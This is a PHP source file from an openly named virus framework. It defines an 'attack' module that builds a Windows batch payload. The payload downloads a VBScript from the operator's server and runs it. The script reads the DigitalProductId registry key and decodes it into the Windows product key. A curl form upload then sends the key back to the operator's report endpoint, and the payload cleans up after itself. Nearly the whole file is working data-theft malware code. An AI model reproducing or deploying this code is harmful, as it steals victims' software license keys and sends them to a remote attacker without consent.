<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\ProductKey;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;
use Kelvinho\Virus\Singleton\Logs;

/**
 * Class ScanPartitions. Scans to see what drives (aka partitions) does the computer has.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class ProductKey extends AttackBase {
    private string $productKey = "";

    public function getProductKey(): string {
        return $this->productKey;
    }

    public function setProductKey(string $productKey): void {
        $this->productKey = explode("\n", $productKey)[3];
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        >"%~pd0pk.vbs" curl <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/vbsScript\n"; ?>
        cScript "%~pd0pk.vbs">"%~pd0file"
        <?php
        echo Windows::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo Windows::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "file=@%~pd0file;filename=file" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
        if ($resourceIdentifier == "vbsScript") { //@formatter:off ?>
            Set WshShell = CreateObject("WScript.Shell")
            Wscript.Echo ConvertToKey(WshShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DigitalProductId"))

            Function ConvertToKey(Key)
                Const KeyOffset = 52
                i = 28
                Chars = "BCDFGHJKMPQRTVWXY2346789"
                Do
                    Cur = 0
                    x = 14
                    Do
                        Cur = Cur * 256
                        Cur = Key(x + KeyOffset) + Cur
                        Key(x + KeyOffset) = (Cur \ 24) And 255
                        Cur = Cur Mod 24
                        x = x -1
                    Loop While x >= 0
                    i = i -1
                    KeyOutput = Mid(Chars, Cur + 1, 1) & KeyOutput
                    If (((29 - i) Mod 6) = 0) And (i <> -1) Then
                        i = i -1
                        KeyOutput = "-" & KeyOutput
                    End If
                Loop While i >= 0
                ConvertToKey = KeyOutput
            End Function
        <?php //@formatter:on
        }
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->productKey = $state["product_key"];
    }

    protected function getState(): string {
        $state = [];
        $state["product_key"] = $this->productKey;
        return json_encode($state);
    }
}
